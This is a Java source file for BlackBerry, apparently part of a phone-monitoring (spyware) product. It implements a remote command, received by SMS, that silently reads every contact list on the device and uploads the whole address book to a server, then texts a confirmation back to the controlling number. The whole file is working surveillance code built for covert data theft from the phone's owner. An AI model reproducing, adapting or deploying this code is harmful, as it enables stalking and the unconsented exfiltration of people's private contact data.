package com.vvt.rmtcmd.sms;

import java.util.Enumeration;
import javax.microedition.pim.PIMException;
import net.rim.blackberry.api.pdap.BlackBerryContact;
import net.rim.blackberry.api.pdap.BlackBerryContactList;
import net.rim.blackberry.api.pdap.BlackBerryPIM;
import com.vvt.global.Global;
import com.vvt.prot.CommandResponse;
import com.vvt.prot.command.response.SendAddressBookCmdResponse;
import com.vvt.protsrv.PhoenixProtocolListener;
import com.vvt.protsrv.SendAddressBookSyncManager;
import com.vvt.protsrv.SendEventManager;
import com.vvt.protsrv.addr.AddressBookStore;
import com.vvt.protsrv.addr.ContactInfo;
import com.vvt.protsrv.addr.ContactStore;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class SMSSendAddressbook extends RmtCmdAsync implements PhoenixProtocolListener {
	
	private SendAddressBookSyncManager sendAddrMng = Global.getSendAddressBookSyncManager();
	private SendEventManager eventSender = Global.getSendEventManager();
	
	public SMSSendAddressbook(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}

	private AddressBookStore initAddressBook() throws PIMException {
		BlackBerryContactList contactList = null;
		try {
			String[] listPIMLists = BlackBerryPIM.getInstance().listPIMLists(BlackBerryPIM.CONTACT_LIST);
			AddressBookStore addrStore = new AddressBookStore();
			for (int i = 0; i < listPIMLists.length; i++) {
				ContactStore contStore = new ContactStore();
				contStore.setAddressBookId(i + 1);
				contactList = (BlackBerryContactList)BlackBerryPIM.getInstance().openPIMList(BlackBerryPIM.CONTACT_LIST, BlackBerryPIM.READ_ONLY, listPIMLists[i]);
				contStore.setAddressBookName(contactList.getName());
				Enumeration contactEnum = contactList.items();		
				while (contactEnum.hasMoreElements()) {
					BlackBerryContact contact = (BlackBerryContact)contactEnum.nextElement();
					ContactInfo contInfo = new ContactInfo();
					contInfo.setClientId("0");
					contInfo.setServerId(0);
					contInfo.setContact(contact);
					contStore.addContact(contInfo);			
				}
				addrStore.addContactStore(contStore);
			}
			return addrStore;
		} finally {
			contactList.close();
		}
	}
	
	// Runnable
	public void run() {
		if (Log.isDebugEnable()) {
			Log.debug("SMSSendAddressbook.run()", "ENTER!");
		}
		doSMSHeader(smsCmdCode.getSendAddressbookCmd());
		responseMessage.append(RmtCmdTextResource.COMMAND_BEING_PROCESSED);
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		sendAddrMng.addListener(this);
		try {
			sendAddrMng.send(initAddressBook());
		} catch (Exception e) {
			Log.error("SMSSendAddressbook.run()", e.getMessage(), e);
			sendAddrMng.removeListener(this);
			doSMSHeader(smsCmdCode.getSendAddressbookCmd());
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			// To create system event.
			createSystemEventOut(responseMessage.toString());
			// To send SMS reply.
			smsMessage.setMessage(responseMessage.toString());
			send();
			// To send events
			eventSender.sendEvents();
		}
	}
	
	public void execute(RmtCmdExecutionListener observer) {
//		Log.debug("SMSSendAddressbook.execute()", "ENTER!");
		smsSender.addListener(this);
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}

	public void onError(String message) {
		Log.error("SMSSendAddressbook.onError()", message);
		sendAddrMng.removeListener(this);
		doSMSHeader(smsCmdCode.getSendAddressbookCmd());
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(message);
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// To send events
		eventSender.sendEvents();
	}

	public void onSuccess(CommandResponse response) {
		sendAddrMng.removeListener(this);
		if (response instanceof SendAddressBookCmdResponse) {
			SendAddressBookCmdResponse sendAddrRes = (SendAddressBookCmdResponse)response;
			doSMSHeader(smsCmdCode.getSendAddressbookCmd());
			if (sendAddrRes.getStatusCode() == 0) {
				responseMessage.append(Constant.OK);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.SET_ADDRESSBOOK_COMPLETE);
			} else {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(sendAddrRes.getServerMsg());
			}
			// To create system event.
			createSystemEventOut(responseMessage.toString());
			// To send SMS reply.
			smsMessage.setMessage(responseMessage.toString());
			send();
			// To send events
			eventSender.sendEvents();
		}
	}

	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("SMSSendAddressbook.smsSendFailed()", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
